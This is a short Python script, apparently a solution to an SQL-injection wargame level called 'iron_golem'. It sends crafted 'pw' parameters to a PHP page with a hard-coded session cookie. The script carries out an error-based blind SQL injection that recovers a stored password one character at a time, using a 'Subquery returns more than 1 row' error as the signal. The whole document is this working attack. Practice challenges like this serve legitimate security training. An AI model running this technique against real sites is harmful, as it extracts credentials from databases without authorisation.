import requests
base="https://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php"
headers={'Cookie': 'PHPSESSID=6i0t96to2iolseq897vqa2j556'}

flag=''
for i in range (1,16):
    for j in range(33,122):
        print(str(i)+"  ::  "+chr(j)+"  ::  "+str(j))
        param="?pw=' or if(ord(substr(pw,"+str(i)+",1))="+str(j)+",1,(select 1 union select 2))-- -"
        page=base+param
        if "Subquery returns more than 1 row" not in (requests.get(page,headers=headers)).text:
            print(page)
            flag+=chr(j)
            print(flag)
            break 

